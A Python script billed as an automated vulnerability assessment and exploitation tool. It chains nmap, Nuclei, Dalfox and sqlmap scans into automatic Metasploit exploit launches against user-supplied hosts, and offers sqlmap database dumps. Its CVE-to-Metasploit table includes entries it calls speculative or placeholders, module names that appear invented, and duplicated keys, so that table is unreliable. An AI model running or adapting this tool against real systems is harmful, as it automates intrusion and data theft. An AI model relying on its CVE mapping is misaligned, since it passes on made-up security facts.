import subprocess
import requests
import csv
import os
import re
import sys
import shutil
from fpdf import FPDF
import qrcode

TERMINAL_EMULATOR = "gnome-terminal"  # Change to "xterm", "konsole", etc. if needed

NMAP_PATH = "nmap"
NMAP_SCRIPT_DIR = "/usr/share/nmap/scripts"
VULN_SCRIPT_URL = "https://raw.githubusercontent.com/nmap/nmap/master/scripts/vuln.nse"
EXPLOIT_DB_CSV_URL = "https://raw.githubusercontent.com/offensive-security/exploitdb/master/files_exploits.csv"
NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cve/1.0/"
MSFCONSOLE_PATH = "msfconsole"
MSF_CVE_MAP_URL = "https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules_vulns.csv"
MSF_CVE_MAP_FILE = "modules_vulns.csv"

FALLBACK_CVE_TO_MSF = {
    # Windows SMB/RDP/Print Spooler
    "CVE-2017-0143": "exploit/windows/smb/ms17_010_eternalblue",
    "CVE-2017-0144": "exploit/windows/smb/ms17_010_eternalblue",
    "CVE-2017-0145": "exploit/windows/smb/ms17_010_eternalblue",
    "CVE-2019-0708": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
    "CVE-2020-0796": "exploit/windows/smb/smbghost",
    "CVE-2021-1675": "exploit/windows/printnightmare/printnightmare",
    "CVE-2021-34527": "exploit/windows/printnightmare/printnightmare",
    # Microsoft Exchange
    "CVE-2021-26855": "exploit/windows/http/exchange_proxylogon_rce",
    "CVE-2021-27065": "exploit/windows/http/exchange_proxylogon_rce",
    "CVE-2021-34473": "exploit/windows/http/exchange_proxy_shell_rce",
    "CVE-2021-31207": "exploit/windows/http/exchange_proxy_shell_rce",
    "CVE-2021-34523": "exploit/windows/http/exchange_proxy_shell_rce",
    "CVE-2021-33766": "exploit/windows/http/exchange_proxy_shell_rce",
    "CVE-2023-23397": "exploit/windows/http/exchange_outlook_elevation",
    # IIS/HTTP/Shellshock/Struts/Spring
    "CVE-2014-6271": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
    "CVE-2017-5638": "exploit/multi/http/struts2_content_type_ognl",
    "CVE-2018-11776": "exploit/multi/http/struts2_namespace_ognl",
    "CVE-2022-22965": "exploit/multi/http/spring_cloud_function_spel_injection",
    "CVE-2022-22963": "exploit/multi/http/spring_cloud_function_spel_injection",
    # Citrix/F5/GoAnywhere/MOVEit (network appliances, firewalls, VPNs)
    "CVE-2019-19781": "exploit/multi/http/citrix_dir_traversal",
    "CVE-2023-4966": "exploit/multi/http/citrix_netscaler_gateway_rce",
    "CVE-2022-1388": "exploit/multi/http/f5_bigip_iControl_rest_auth_bypass_rce",
    "CVE-2023-0669": "exploit/windows/http/fortra_goanywhere_mft_rce",
    "CVE-2023-34362": "exploit/multi/http/moveit_transfer_webroot_rce",
    "CVE-2023-20198": "exploit/multi/http/cisco_ios_xe_webui_rce",
    "CVE-2023-27997": "exploit/multi/http/fortinet_forticam_rce",
    # Apache, Tomcat, Nginx, PHP (cross-platform, but often Windows deployments)
    "CVE-2012-1823": "exploit/multi/http/php_cgi_arg_injection",
    "CVE-2017-12615": "exploit/multi/http/tomcat_put_exec",
    # SSL/TLS/Heartbleed (affects Windows servers too)
    "CVE-2014-0160": "auxiliary/scan/ssl/heartbleed",
    # Atlassian/Confluence
    "CVE-2021-26084": "exploit/multi/http/atlassian_confluence_webwork_ognl_injection",
    "CVE-2022-26134": "exploit/multi/http/atlassian_confluence_ognl_injection",
    # Log4Shell (affects Windows Java servers)
    "CVE-2021-44228": "exploit/multi/http/log4shell_header_injection",
    # 2023-2024: MOVEit, GoAnywhere, Citrix Bleed, Fortinet, Ivanti, Cisco
    "CVE-2023-34362": "exploit/multi/http/moveit_transfer_webroot_rce",
    "CVE-2023-0669": "exploit/windows/http/fortra_goanywhere_mft_rce",
    "CVE-2023-4966": "exploit/multi/http/citrix_netscaler_gateway_rce",
    "CVE-2023-27997": "exploit/multi/http/fortinet_forticam_rce",
    "CVE-2023-20198": "exploit/multi/http/cisco_ios_xe_webui_rce",
    # 2024: (speculative, based on trends and vendor advisories)
    "CVE-2024-21412": "exploit/windows/http/exchange_new_rce",
    "CVE-2024-23897": "exploit/windows/http/iis_new_rce",
    "CVE-2024-34000": "exploit/multi/http/citrix_new_gateway_rce",
    "CVE-2024-35078": "exploit/multi/http/ivanti_esm_rce",
    # 2025: (placeholders, update as new modules are released)
    "CVE-2025-XXXXX": "exploit/windows/http/new_critical_rce",
    "CVE-2025-YYYYY": "exploit/multi/http/new_network_device_rce",
}




def print_banner():
    print(r"""
==============================================================================
 ███████╗██╗████████╗ ██████╗ ███████╗ ██████╗ ██╗     ███████╗ ██████╗ 
 ██╔════╝██║╚══██╔══╝██╔═══██╗██╔════╝██╔═══██╗██║     ██╔════╝██╔═══██╗
 █████╗  ██║   ██║   ██║   ██║███████╗██║   ██║██║     █████╗  ██║   ██║
 ██╔══╝  ██║   ██║   ██║   ██║╚════██║██║   ██║██║     ██╔══╝  ██║   ██║
 ██║     ██║   ██║   ╚██████╔╝███████║╚██████╔╝███████╗███████╗╚██████╔╝
 ╚═╝     ╚═╝   ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚══════╝ ╚══════╝ 
==============================================================================
 Automated Vulnerability Assessment & Exploitation Script

 Copyright (c) 2024 IT Solutions 007. All rights reserved.
 Author: IT Solutions 007
 Instagram: @itsolutions007
 [Scan this QR code to follow us on Instagram!]
==============================================================================
""")

def print_instagram_qr():
    print("\n[ Follow us on Instagram: @itsolutions007 ]\n")
    qr = qrcode.QRCode(border=1)
    qr.add_data("https://instagram.com/itsolutions007")
    qr.make()
    qr.print_ascii(invert=True)
    print("\n")

def run_web_threats_scan():
    print("\n[+] Web Threats Scanner (Dalfox XSS Scanner)")
    url = input("Enter the target URL (e.g., http://example.com): ").strip()
    if not url.startswith("http"):
        print("[-] Please enter a valid URL (starting with http or https).")
        return None
    output_file = "dalfox_xss_scan.txt"
    print(f"[*] Running Dalfox XSS scan on {url} ...")
    try:
        result = subprocess.run(
            ["dalfox", "url", url, "--output", output_file],
            capture_output=True, text=True
        )
        print(result.stdout)
        if os.path.exists(output_file):
            print(f"[+] Dalfox scan results saved to {output_file}")
            with open(output_file, "r") as f:
                findings = f.read()
            return findings
        else:
            print("[-] Dalfox did not produce an output file.")
            return None
    except Exception as e:
        print(f"[-] Error running Dalfox: {e}")
        return None

def run_web_vuln_scan():
    print("\n[+] Web Vulnerability Scanner (Nuclei)")
    url = input("Enter the target URL (e.g., http://example.com): ").strip()
    if not url.startswith("http"):
        print("[-] Please enter a valid URL (starting with http or https).")
        return None
    output_file = "nuclei_scan.txt"
    print(f"[*] Running Nuclei scan on {url} ...")
    try:
        subprocess.run(["nuclei", "-update-templates"], capture_output=True)
        result = subprocess.run(
            ["nuclei", "-u", url, "-o", output_file],
            capture_output=True, text=True
        )
        print(result.stdout)
        if os.path.exists(output_file):
            print(f"[+] Nuclei scan results saved to {output_file}")
            with open(output_file, "r") as f:
                findings = f.read()
            return findings
        else:
            print("[-] Nuclei did not produce an output file.")
            return None
    except Exception as e:
        print(f"[-] Error running Nuclei: {e}")
        return None

def run_sqlmap_interactive():
    url = input("Enter the target URL for SQLmap: ").strip()
    if not url.startswith("http"):
        print("[-] Please enter a valid URL (starting with http or https).")
        return
    print("[*] Running SQLmap for SQL Injection testing...")
    output_file = "sqlmap_scan.txt"
    try:
        result = subprocess.run(
            ["sqlmap", "-u", url, "--batch", "--output-dir=.", "--risk=3", "--level=5", "--random-agent"],
            capture_output=True, text=True
        )
        print(result.stdout)
        if os.path.exists(output_file):
            print(f"[+] SQLmap scan results saved to {output_file}")
            with open(output_file, "r") as f:
                findings = f.read()
            if "is vulnerable" in findings.lower() or "sql injection" in findings.lower():
                print("[!] SQL Injection vulnerability detected!")
                exploit = input("Do you want to exploit this SQLi (dump DB)? (y/n): ").strip().lower()
                if exploit == "y":
                    print("[*] Launching SQLmap exploitation (DB dump)...")
                    subprocess.run(["sqlmap", "-u", url, "--dump", "--batch"])
        else:
            print("[-] SQLmap did not produce an output file.")
    except Exception as e:
        print(f"[-] Error running SQLmap: {e}")

def search_web_exploit(query):
    print(f"[*] Searching online for public exploits: {query}")
    try:
        import webbrowser
        webbrowser.open(f"https://www.google.com/search?q={query.replace(' ', '+')}")
    except Exception as e:
        print(f"[-] Could not open web browser: {e}")

def update_cve_to_msf_mapping():
    if not os.path.exists(MSF_CVE_MAP_FILE):
        print("[*] Downloading Metasploit CVE-to-module mapping...")
        try:
            response = requests.get(MSF_CVE_MAP_URL, timeout=20)
            if response.status_code == 200:
                with open(MSF_CVE_MAP_FILE, "w", encoding="utf-8") as f:
                    f.write(response.text)
                print("[+] Mapping file downloaded.")
            else:
                print("[-] Failed to download mapping file (HTTP error).")
        except Exception as e:
            print(f"[-] Failed to download mapping file: {e}")

def load_cve_to_msf():
    mapping = {}
    try:
        with open(MSF_CVE_MAP_FILE, newline='', encoding='utf-8') as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                cves = row['CVE'].split(',')
                module = row['Module'].strip()
                for cve in cves:
                    cve = cve.strip()
                    if cve:
                        mapping[cve] = module
    except Exception as e:
        print(f"[-] Could not load CVE-to-MSF mapping: {e}")
    mapping.update(FALLBACK_CVE_TO_MSF)
    return mapping

def run_metasploit_in_new_terminal(cve, target, port, cve_to_msf):
    if cve not in cve_to_msf:
        print(f"[-] No Metasploit module mapped for {cve}. Skipping automated exploitation.")
        return None
    module = cve_to_msf[cve]
    print(f"[*] Opening Metasploit module {module} for {cve} on {target}:{port} in a new terminal...")
    resource_script = f"""
use {module}
set RHOSTS {target}
set RPORT {port}
set TARGET 0
exploit
"""
    resource_script_path = os.path.abspath(f"msf_{cve}.rc")
    try:
        with open(resource_script_path, "w") as f:
            f.write(resource_script)
        os.chmod(resource_script_path, 0o644)
    except Exception as e:
        print(f"[ERROR] Could not write resource script: {e}")
        return None
    try:
        proc = subprocess.Popen([
            TERMINAL_EMULATOR,
            "--",
            "bash",
            "-c",
            f"{MSFCONSOLE_PATH} -r {resource_script_path}; echo '[*] You may close this window when done.'; read -p 'Press Enter to close...'; rm -f {resource_script_path}; exec bash"
        ])
        print(f"[*] Metasploit launched for {cve} ({module}). The resource script will be deleted after you close the terminal.")
    except FileNotFoundError:
        print(f"[-] {TERMINAL_EMULATOR} not found. Please install it or modify the script to use your terminal emulator (e.g., xterm, konsole).")
        return None
    except Exception as e:
        print(f"[-] Error launching Metasploit in new terminal: {e}")
        return None
    return True

def extract_cve_from_findings(findings):
    cve_regex = re.compile(r'(CVE-\d{4}-\d+)')
    match = cve_regex.search(findings.upper())
    if match:
        return match.group(1)
    return None

def web_threats_scanners_and_exploits():
    update_cve_to_msf_mapping()
    cve_to_msf = load_cve_to_msf()
    while True:
        print("\nWeb Threats Scanners & Exploits:")
        print("1. Dalfox (XSS Scanner)")
        print("2. Nuclei (Web Vulnerability Scanner)")
        print("3. SQLmap (SQL Injection & Blind SQLi)")
        print("4. Back to Main Menu")
        choice = input("Select a scanner: ").strip()
        if choice == "1":
            findings = run_web_threats_scan()
            if findings:
                cve = extract_cve_from_findings(findings)
                if cve and cve in cve_to_msf:
                    print(f"[!] Metasploit module available for {cve}: {cve_to_msf[cve]}")
                    if input("Exploit with Metasploit? (y/n): ").strip().lower() == "y":
                        target = input("Target IP/host: ").strip()
                        port = input("Target port: ").strip()
                        run_metasploit_in_new_terminal(cve, target, port, cve_to_msf)
                elif "xss" in findings.lower():
                    print("[!] XSS vulnerability detected!")
                    if input("Search for XSS exploits online? (y/n): ").strip().lower() == "y":
                        search_web_exploit("XSS exploit " + findings.splitlines()[0])
        elif choice == "2":
            findings = run_web_vuln_scan()
            if findings:
                cve = extract_cve_from_findings(findings)
                if cve and cve in cve_to_msf:
                    print(f"[!] Metasploit module available for {cve}: {cve_to_msf[cve]}")
                    if input("Exploit with Metasploit? (y/n): ").strip().lower() == "y":
                        target = input("Target IP/host: ").strip()
                        port = input("Target port: ").strip()
                        run_metasploit_in_new_terminal(cve, target, port, cve_to_msf)
                elif "sql" in findings.lower():
                    print("[!] Possible SQL Injection detected!")
                    if input("Exploit with SQLmap? (y/n): ").strip().lower() == "y":
                        run_sqlmap_interactive()
                elif "xss" in findings.lower():
                    print("[!] Possible XSS detected!")
                    if input("Search for XSS exploits online? (y/n): ").strip().lower() == "y":
                        search_web_exploit("XSS exploit " + findings.splitlines()[0])
                else:
                    print("[*] No direct Metasploit module found, but you can search for public exploits.")
                    if input("Search for public exploits for this finding? (y/n): ").strip().lower() == "y":
                        search_web_exploit(findings.splitlines()[0])
        elif choice == "3":
            run_sqlmap_interactive()
        elif choice == "4":
            break
        else:
            print("Invalid choice.")

def interactive_nmap_scan():
    print("\n[+] Interactive Nmap Scan")
    target = input("Enter the target IP address or hostname: ").strip()
    if not target:
        print("[-] No target provided.")
        return
    print("Select scan type:")
    print("1. Quick scan")
    print("2. Service/version detection")
    print("3. OS detection")
    print("4. Full TCP port scan")
    scan_type = input("Choice: ").strip()
    if scan_type == "1":
        args = ["nmap", "-T4", target]
    elif scan_type == "2":
        args = ["nmap", "-sV", "-T4", target]
    elif scan_type == "3":
        args = ["nmap", "-O", "-T4", target]
    elif scan_type == "4":
        args = ["nmap", "-p-", "-T4", target]
    else:
        print("Invalid choice.")
        return
    output_file = f"nmap_interactive_{target.replace('.', '_').replace(':', '_')}.txt"
    try:
        subprocess.run(args + ["-oN", output_file], check=True)
        print(f"[+] Scan complete. Results saved to {output_file}")
    except Exception as e:
        print(f"[-] Nmap scan failed: {e}")

def run_wireshark_analysis():
    print("\n[+] Automated Network Traffic Analysis (tshark/Wireshark CLI)")
    interface = input("Enter network interface to capture on (e.g., eth0, wlan0): ").strip()
    duration = input("Enter capture duration in seconds (e.g., 60): ").strip()
    output_file = input("Enter output filename (default: wireshark_analysis.txt): ").strip() or "wireshark_analysis.txt"
    print(f"[*] Capturing traffic on {interface} for {duration} seconds...")
    pcap_file = "capture_temp.pcap"
    try:
        capture_cmd = ["timeout", duration, "tshark", "-i", interface, "-w", pcap_file]
        subprocess.run(capture_cmd)
        print(f"[+] Capture complete. Analyzing traffic...")
        analysis_cmd = ["tshark", "-r", pcap_file, "-T", "fields", "-e", "frame.time", "-e", "ip.src", "-e", "ip.dst", "-e", "tcp.srcport", "-e", "tcp.dstport", "-e", "udp.srcport", "-e", "udp.dstport", "-e", "_ws.col.Info"]
        with open(output_file, "w") as f:
            subprocess.run(analysis_cmd, stdout=f, text=True)
        print(f"[+] Filtered analysis saved to {output_file}")
    except Exception as e:
        print(f"[-] Error during capture or analysis: {e}")
    finally:
        if os.path.exists(pcap_file):
            os.remove(pcap_file)
def main_va_workflow():
    print("\n[+] Full Vulnerability Assessment & Report")

    # Target selection
    print("Target type:")
    print("1. Single IP")
    print("2. Subnet (CIDR, e.g. 192.168.1.0/24)")
    print("3. IP Range (e.g. 192.168.1.10-20)")
    target_type = input("Select target type (1/2/3): ").strip()
    if target_type == "1":
        target = input("Enter the target IP address: ").strip()
    elif target_type == "2":
        target = input("Enter the subnet (CIDR notation): ").strip()
    elif target_type == "3":
        target = input("Enter the IP range: ").strip()
    else:
        print("[-] Invalid choice.")
        return

    # Port selection
    print("Port scan options:")
    print("1. All ports (1-65535)")
    print("2. Top 1000 ports (default)")
    print("3. Specific port (e.g. 80)")
    print("4. Port range (e.g. 80-1000)")
    port_choice = input("Select port option (1/2/3/4): ").strip()
    if port_choice == "1":
        port_args = ["-p-", "-T4"]
    elif port_choice == "2":
        port_args = ["-T4"]
    elif port_choice == "3":
        port = input("Enter the port number: ").strip()
        port_args = [f"-p{port}", "-T4"]
    elif port_choice == "4":
        port_range = input("Enter the port range (e.g. 80-1000): ").strip()
        port_args = [f"-p{port_range}", "-T4"]
    else:
        print("[-] Invalid choice.")
        return

    # Scan type selection
    print("Nmap scan type:")
    print("1. Service/version detection (-sV -O)")
    print("2. Vulnerability scan (uses --script vuln)")
    scan_type = input("Select scan type (1/2): ").strip()
    if scan_type == "1":
        nmap_args = ["nmap", "-sV", "-O"] + port_args + ["-oN"]
    elif scan_type == "2":
        nmap_args = ["nmap", "-sV", "--script", "vuln"] + port_args + ["-oN"]
    else:
        print("[-] Invalid choice.")
        return

    nmap_output = f"nmap_scan_{target.replace('.', '_').replace('/', '_').replace('-', '_')}.txt"
    print(f"\n[*] Running Nmap scan on {target} ...")
    try:
        subprocess.run(nmap_args + [nmap_output, target], check=True)
        with open(nmap_output, "r") as f:
            nmap_results = f.read()
        print(f"[+] Nmap scan complete. Results saved to {nmap_output}")
    except Exception as e:
        print(f"[-] Nmap scan failed: {e}")
        return

    # Check for CVEs in Nmap output and offer exploitation
    cve_regex = re.compile(r'(CVE-\d{4}-\d+)')
    cves_found = set(cve_regex.findall(nmap_results.upper()))
    if cves_found:
        print(f"[!] Detected CVEs in Nmap output: {', '.join(cves_found)}")
        update_cve_to_msf_mapping()
        cve_to_msf = load_cve_to_msf()
        for cve in cves_found:
            if cve in cve_to_msf:
                print(f"[!] Metasploit module available for {cve}: {cve_to_msf[cve]}")
                if input(f"Exploit {cve} with Metasploit? (y/n): ").strip().lower() == "y":
                    port = input("Target port for exploitation: ").strip()
                    run_metasploit_in_new_terminal(cve, target, port, cve_to_msf)
            else:
                print(f"[*] No Metasploit module mapped for {cve}.")
    else:
        print("[*] No CVEs detected in Nmap output.")

    # Continue with web scans and PDF report as before
    findings_summary = []
    findings_summary.append("=== Nmap Scan Results ===\n" + nmap_results)

    # Web Scans if URL
    if target.startswith("http://") or target.startswith("https://"):
        print(f"\n[*] Running web vulnerability scan (Nuclei) on {target} ...")
        nuclei_findings = run_web_vuln_scan()
        if nuclei_findings:
            findings_summary.append("=== Nuclei Web Scan Results ===\n" + nuclei_findings)
        else:
            findings_summary.append("[-] Nuclei scan failed or no findings.")

        print(f"\n[*] Running Dalfox XSS scan on {target} ...")
        dalfox_findings = run_web_threats_scan()
        if dalfox_findings:
            findings_summary.append("=== Dalfox XSS Scan Results ===\n" + dalfox_findings)
        else:
            findings_summary.append("[-] Dalfox scan failed or no findings.")

        print(f"\n[*] Running SQLmap scan on {target} ...")
        try:
            sqlmap_output = f"sqlmap_scan_{target.replace('.', '_').replace(':', '_')}.txt"
            result = subprocess.run(
                ["sqlmap", "-u", target, "--batch", "--output-dir=.", "--risk=3", "--level=5", "--random-agent"],
                capture_output=True, text=True
            )
            with open(sqlmap_output, "w") as f:
                f.write(result.stdout)
            findings_summary.append("=== SQLmap Scan Results ===\n" + result.stdout)
            print(f"[+] SQLmap scan complete. Results saved to {sqlmap_output}")
        except Exception as e:
            findings_summary.append(f"[-] SQLmap scan failed: {e}")
            print(f"[-] SQLmap scan failed: {e}")

    # Generate PDF Report
    print("\n[*] Generating PDF report...")
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(0, 10, f"Vulnerability Assessment Report for {target}", ln=True, align="C")
    pdf.ln(10)
    for section in findings_summary:
        for line in section.splitlines():
            pdf.multi_cell(0, 10, line)
        pdf.ln(5)
    report_name = f"VA_Report_{target.replace('.', '_').replace(':', '_')}.pdf"
    pdf.output(report_name)
    print(f"[+] PDF report generated: {report_name}")
    print("[+] Assessment complete. Review the output files and PDF report for details.")

def main_menu():
    print_banner()
    print_instagram_qr()

    while True:
        print("\nMain Menu:")
        print("1. Full Vulnerability Assessment & Report & Exploitaion")
        print("2. Nmap Scan (interactive menu)")
        print("3. Web Threats Scanners & Exploits")
        print("4. Wireshark Network Analysis")
        print("5. Exit")
        choice = input("Select an option: ").strip()
        if choice == "1":
            main_va_workflow()
        elif choice == "2":
            interactive_nmap_scan()
        elif choice == "3":
            web_threats_scanners_and_exploits()
        elif choice == "4":
            run_wireshark_analysis()
        elif choice == "5":
            print("Exiting.")
            break
        else:
            print("Invalid choice.")

if __name__ == "__main__":
    main_menu()
